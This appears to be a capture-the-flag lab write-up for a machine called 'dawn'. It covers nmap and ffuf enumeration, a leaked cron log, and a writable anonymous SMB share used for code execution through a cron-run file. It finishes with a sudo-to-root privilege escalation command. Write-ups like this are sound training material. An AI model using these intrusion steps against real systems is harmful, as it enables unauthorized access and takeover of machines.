# Export
```md
export IP="192.168.113.11"
export URL="http://192.168.113.11/FUZZ"
export LIP="192.168.49.113"
```


<hr>

# Credentials Panel
+ ( Web ): 

<hr>

# Initial Foothold
+ Crontab finds `web-control` located in the SMB file share and executes it.
+ Login into SMB as anonymous user → Upload a malicious `web-control` → Wait for cronjob.

<hr>

# Privilege Escalation
+ SUDO

<hr>

# Nmap

```bash
PORT     STATE SERVICE     REASON         VERSION                                                                                                                                                                  
80/tcp   open  http        syn-ack ttl 63 Apache httpd 2.4.38 ((Debian))                                                                                                                                           
| http-methods:                                                                                                                                                                                                    
|_  Supported Methods: GET POST OPTIONS HEAD                                                                                                                                                                       
|_http-server-header: Apache/2.4.38 (Debian)                                                                                                                                                                       
|_http-title: Site doesn't have a title (text/html).                                                                                                                                                               
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                                                                                                                              
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)                                                                                                                           
3306/tcp open  mysql       syn-ack ttl 63 MySQL 5.5.5-10.3.15-MariaDB-1                                                                                                                                            
| mysql-info:                                                                                                                                                                                                      
|   Protocol: 10                                                                                                                                                                                                   
|   Version: 5.5.5-10.3.15-MariaDB-1                                                                                                                                                                               
|   Thread ID: 18                                                                                                                                                                                                  
|   Capabilities flags: 63486                                                                                                                                                                                      
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, Speaks41ProtocolNew, SupportsTransactions, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, InteractiveClient, SupportsLoadDataLocal, ODBCClient, ConnectWi
thDatabase, LongColumnFlag, FoundRows, SupportsCompression, DontAllowDatabaseTableColumn, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults                                                  
|   Status: Autocommit                                                                                                                                                                                             
|   Salt: n.8m?0qlHb7(c;=]?aL:                                                                                                                                                                                     
|_  Auth Plugin Name: mysql_native_password                                                                                                                                                                        
OS fingerprint not ideal because: maxTimingRatio (1.790000e+00) is greater than 1.4                                                                                                                                
Aggressive OS guesses: Linux 4.4 (94%), Linux 3.10 - 3.12 (94%), Linux 4.0 (92%), Linux 4.9 (92%), Linux 3.10 - 3.16 (92%), Linux 3.11 - 4.1 (91%), Linux 2.6.32 (91%), Linux 3.4 (91%), Linux 3.5 (91%), Linux 4.2
 (91%)
```


<hr>

# Web Application
### Port 80

+ Default web contents

```md
$ curl -s $URL | html2text 

****** Website currently under construction, try again later. ******
In case you are suffering from any kind of inconvenience with your device
provided by the corporation please contact with IT support as soon as possible,
however, if you are not affiliated by any means with "Non-Existent Corporation
and Associates" (NECA) LEAVE THIS SITE RIGHT NOW.
===============================================================================
**** Things we need to implement: ****
    * Install camera feeds.
    * Update our personal.
    * Install a control panel.
```


### Discovery

+ Hidden directories:

```bash
$ ffuf -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt

logs                    [Status: 301, Size: 315, Words: 20, Lines: 10]
                        [Status: 200, Size: 791, Words: 228, Lines: 23]
server-status           [Status: 403, Size: 302, Words: 22, Lines: 12]
cctv                    [Status: 301, Size: 315, Words: 20, Lines: 10]
:: Progress: [20116/20116] :: Job [1/1] :: 137 req/sec :: Duration: [0:02:26] :: Errors: 0 ::
```

+ `/logs/management.log` is downloadable.

```md
[...snip...]

2020/08/12 09:05:01 CMD: UID=33   PID=965    | /bin/sh -c /home/dawn/ITDEPT/web-control 
2020/08/12 09:05:01 CMD: UID=1000 PID=970    | /bin/sh -c /home/dawn/ITDEPT/product-control 
2020/08/12 09:06:01 CMD: UID=0    PID=975    | /usr/sbin/CRON -f 
2020/08/12 09:06:01 CMD: UID=0    PID=974    | /usr/sbin/cron -f 
2020/08/12 09:06:01 CMD: UID=0    PID=973    | /usr/sbin/cron -f 
2020/08/12 09:06:01 CMD: UID=0    PID=972    | /usr/sbin/cron -f 
2020/08/12 09:06:01 CMD: UID=0    PID=971    | /usr/sbin/cron -f 
2020/08/12 09:06:01 CMD: UID=0    PID=980    | /usr/sbin/CRON -f 
2020/08/12 09:06:01 CMD: UID=0    PID=979    | /bin/sh -c /home/ganimedes/phobos 
2020/08/12 09:06:01 CMD: UID=0    PID=978    | /bin/sh -c chmod 777 /home/dawn/ITDEPT/web-control 
2020/08/12 09:06:01 CMD: UID=0    PID=977    | /bin/sh -c chmod 777 /home/dawn/ITDEPT/product-control 
2020/08/12 09:06:01 CMD: UID=1000 PID=985    | /bin/sh -c /home/dawn/ITDEPT/product-control 
2020/08/12 09:06:01 CMD: UID=0    PID=984    | /bin/sh -c chmod 777 /home/dawn/ITDEPT/web-control 
2020/08/12 09:06:01 CMD: UID=33   PID=982    | /bin/sh -c /home/dawn/ITDEPT/web-control 
2020/08/12 09:06:01 CMD: UID=33   PID=986    | /bin/sh -c /home/dawn/ITDEPT/web-control 
2020/08/12 09:07:00 CMD: UID=0    PID=987    | /usr/sbin/anacron -d -q -s 
2020/08/12 09:07:00 CMD: UID=0    PID=988    | /bin/sh -c run-parts --report /etc/cron.daily 

[...snip...]
```


 + Valid users → `dawn`, `ganimedes`

<hr>

# SMB
+ Files share

```bash
$ smbclient -L $IP

Enter WORKGROUP\jaenguyen's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        ITDEPT          Disk      PLEASE DO NOT REMOVE THIS SHARE. IN CASE YOU ARE NOT AUTHORIZED TO USE THIS SYSTEM LEAVE IMMEADIATELY.
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
```

+ Anonymous login allowed:

```bash
$ smbclient \\\\$IP\\ITDEPT

Enter WORKGROUP\jaenguyen's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Aug  3 13:23:20 2019
  ..                                  D        0  Thu Jul 23 03:19:41 2020

                7158264 blocks of size 1024. 3508692 blocks available
```


+ Write permission for anonymous user.

```bash
smb: \> put test
putting file test as \test (0.0 kb/s) (average 0.0 kb/s)
smb: \> ls
  .                                   D        0  Sat Jul 24 21:58:06 2021
  ..                                  D        0  Thu Jul 23 03:19:41 2020
  test                                A        0  Sat Jul 24 21:58:06 2021

                7158264 blocks of size 1024. 3508688 blocks available
```


<hr>

# Local Enumeration
+ Network

```bash
$ ss -anlt
State                        Recv-Q                       Send-Q                                             Local Address:Port                                             Peer Address:Port                      
LISTEN                       0                            50                                                       0.0.0.0:445                                                   0.0.0.0:*                         
LISTEN                       0                            128                                                      0.0.0.0:3306                                                  0.0.0.0:*                         
LISTEN                       0                            50                                                       0.0.0.0:139                                                   0.0.0.0:*                         
LISTEN                       0                            5                                                      127.0.0.1:631                                                   0.0.0.0:*                         
LISTEN                       0                            50                                                          [::]:445                                                      [::]:*                         
LISTEN                       0                            50                                                          [::]:139                                                      [::]:*                         
LISTEN                       0                            128                                                            *:80                                                          *:*                         
```

+ Local users:

```bash
www-data@dawn:/$ cat /etc/passwd | grep sh

root:x:0:0:root:/root:/bin/bash
dawn:x:1000:1000:dawn,,,:/home/dawn:/bin/bash
ganimedes:x:1001:1001:,,,:/home/ganimedes:/bin/bash
```

+ Can `www-data` run sudo? YES

```bash
www-data@dawn:/home/dawn$ sudo -l
Matching Defaults entries for www-data on dawn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on dawn:
    (root) NOPASSWD: /usr/bin/sudo
```



```bash
www-data@dawn:/home/dawn$ sudo -u root /usr/bin/sudo /bin/bash
root@dawn:/home/dawn# id
uid=0(root) gid=0(root) groups=0(root)
```